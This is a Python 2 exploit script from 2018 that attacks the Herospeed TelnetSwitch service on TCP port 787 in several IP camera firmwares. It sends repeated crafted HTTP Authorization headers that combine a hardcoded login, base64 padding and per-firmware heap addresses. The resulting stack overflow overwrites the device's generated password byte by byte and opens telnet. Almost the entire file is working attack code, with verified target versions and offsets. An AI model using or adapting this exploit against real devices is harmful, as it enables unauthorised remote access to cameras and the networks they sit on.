#!/usr/bin/env python2.7
#
# Herospeed TelnetSwitch daemon running on TCP/787, for allowing enable of the telnetd.
# Where one small stack overflow allows us to overwrite the dynamicly generated password and enable telnetd.
#
# [Verified]
# 1) Fullhan IPC FH8830_F22_W_7.1.42.1
# 2) Fullhan FH8830_AR0330_FISHEYE_W_7.1.37.5
# 3) HiSilicon 3518EV200_OV9732_W_7.1.25.1, 3519V100_IMX274_W_7.1.39.3
# 4) Ambarella s2l55m_imx123_W_7.1.25.2, S2E66_IMX178_W_7.1.3.4
#
# Author: bashis <mcw noemail eu>, 2018
#
import socket
import select
import sys
import argparse
import base64
import struct
import time
#
# Validate correctness of HOST, IP and PORT
#
class Validate:

	def __init__(self,verbose):
		self.verbose = verbose

	# Check if IP is valid
	def CheckIP(self,IP):
		self.IP = IP

		ip = self.IP.split('.')
		if len(ip) != 4:
			return False
		for tmp in ip:
			if not tmp.isdigit():
				return False
			i = int(tmp)
			if i < 0 or i > 255:
				return False
		return True

	# Check if PORT is valid
	def Port(self,PORT):
		self.PORT = PORT

		if int(self.PORT) < 1 or int(self.PORT) > 65535:
			return False
		else:
			return True

	# Check if HOST is valid
	def Host(self,HOST):
		self.HOST = HOST

		try:
			# Check valid IP
			socket.inet_aton(self.HOST) # Will generate exeption if we try with DNS or invalid IP
			# Now we check if it is correct typed IP
			if self.CheckIP(self.HOST):
				return self.HOST
			else:
				return False
		except socket.error as e:
			# Else check valid DNS name, and use the IP address
			try:
				self.HOST = socket.gethostbyname(self.HOST)
				return self.HOST
			except socket.error as e:
				return False


if __name__ == "__main__":

	INFO =  '\n[Herospeed TelnetSwitch pwn (2018 bashis <mcw noemail eu>)]\n'
	rhost = '192.168.57.20'	# Default Remote HOST
	rport = 787			# Default Remote PORT
	BUFFER_SIZE = 1024

	try:
		arg_parser = argparse.ArgumentParser(
		prog=sys.argv[0],
				description=('[*] '+ INFO +' [*]'))
		arg_parser.add_argument('--rhost', required=True, help='Remote Target Address (IP/FQDN) [Default: '+ rhost +']')
		arg_parser.add_argument('--rport', required=False, help='Remote Target HTTP/HTTPS Port [Default: '+ str(rport) +']')
		args = arg_parser.parse_args()
	except Exception as e:
		print INFO,"\nError: {}\n".format(str(e))
		sys.exit(1)

	print INFO
	if args.rport:
		rport = int(args.rport)

	if args.rhost:
		rhost = args.rhost
		IP = args.rhost

	# Check if RPORT is valid
	if not Validate(True).Port(rport):
		print "[!] Invalid RPORT - Choose between 1 and 65535"
		sys.exit(1)

	# Check if RHOST is valid IP or FQDN, get IP back
	rhost = Validate(True).Host(rhost)
	if not rhost:
		print "[!] Invalid RHOST"
		sys.exit(1)

	timeout = 5
	socket.setdefaulttimeout(timeout)

	#
	# [Payload]
	#

	LOGIN = "Lucky787"		# Hardcoded login
	#
	# Fullhan IPC FH8830_F22_W_7.1.42.1
	# Fullhan FH8830_AR0330_FISHEYE_W_7.1.37.5
	#
	PASSWD = "\n\n\n\n\n\n\n\n\n\n\n\n"	# Our new password, must be exactly 12 char, and must be '\n'
	MESSAGE =  ''+ LOGIN + ':' + PASSWD +''
	BASE64_NULL = "A" * 232 # Decoded as 0x00 with base64 decode
	HEAP_PWD = 0x00016c8c # Start of the dynamicly generated password, located on heap

	#
	# HiSilicon 3518EV200_OV9732_W_7.1.25.1
	#
#	PASSWD = "AAAAAAAAAAAA"	# Our new password, must be exactly 12 char, and must be 'A'
#	MESSAGE =  ''+ LOGIN + ':' + PASSWD +''
#	BASE64_NULL = "A" * 364 # Decoded as 0x00 with base64 decode
#	HEAP_PWD = 0x00016990 # Start of the dynamicly generated password, located on heap

	#
	# HiSilicon 3519V100_IMX274_W_7.1.39.3
	#
#	PASSWD = "AAAAAAAAAAAA"	# Our new password, must be exactly 12 char, and must be 'A'
#	MESSAGE =  ''+ LOGIN + ':' + PASSWD +''
#	BASE64_NULL = "A" * 364 # Decoded as 0x00 with base64 decode
#	HEAP_PWD = 0x000267b0 # Start of the dynamicly generated password, located on heap

	#
	# Ambarella s2l55m_imx123_W_7.1.25.2
	#
#	PASSWD = "AAAAAAAAAAAA"	# Our new password, must be exactly 12 char, and must be 'A'
#	MESSAGE =  ''+ LOGIN + ':' + PASSWD +''
#	BASE64_NULL = "A" * 364 # Decoded as 0x00 with base64 decode
#	HEAP_PWD = 0x00014c3c # Start of the dynamicly generated password, located on heap

	#
	# Ambarella S2E66_IMX178_W_7.1.3.4
	#
#	PASSWD = "AAAAAAAAAAAA"	# Our new password, must be exactly 12 char, and must be 'A'
#	MESSAGE =  ''+ LOGIN + ':' + PASSWD +''
#	BASE64_NULL = "A" * 108 # Decoded as 0x00 with base64 decode
#	HEAP_PWD = 0x00014c68 # Start of the dynamicly generated password, located on heap

	MESSAGE = base64.b64encode(bytes(MESSAGE))
	MESSAGE += BASE64_NULL

	#
	# Since the stack overflow writing with only one byte, we need overwrite the password one char at the time (looping twelve times)
	#
	for where in range(0, len(PASSWD)):
		OUT = "GET / HTTP/1.0\nAuthorization: Basic {}{}\n\n".format(MESSAGE,struct.pack('<L',HEAP_PWD)[:3])
		print "Writing to: {}".format(hex(HEAP_PWD))
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((rhost, rport))
		s.send(OUT)
		time.sleep(0.5)
		response = s.recv(BUFFER_SIZE).split()
		HEAP_PWD += 0x1 # Next address on heap

		if response[1]:
			if response[1] == "200":
				print "({}) OK, telnetd should be open!".format(response[1])
				break